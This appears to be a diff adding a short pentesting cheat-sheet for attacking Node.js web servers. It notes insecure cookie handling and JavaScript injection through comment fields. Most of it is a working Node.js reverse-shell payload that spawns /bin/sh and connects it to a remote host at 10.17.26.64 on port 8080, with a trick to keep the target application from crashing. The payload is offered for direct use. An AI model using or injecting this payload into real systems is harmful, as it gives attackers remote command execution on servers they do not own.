@@ -1,0 +1,23 @@
+If we find a webserver with powered by Nodejs, we must have in mind:
+
+- Check insecure management of cookies, specifically, cookies that aim to manage the security of the web when we steal credentials or create a new user.
+- If we can introduce input in events, comments, or stuff like that, the server could be vulnerable to JavaScript injection.
+
+
+```JavaScript ReverseShell
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "10.17.26.64", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+```
+
+
+
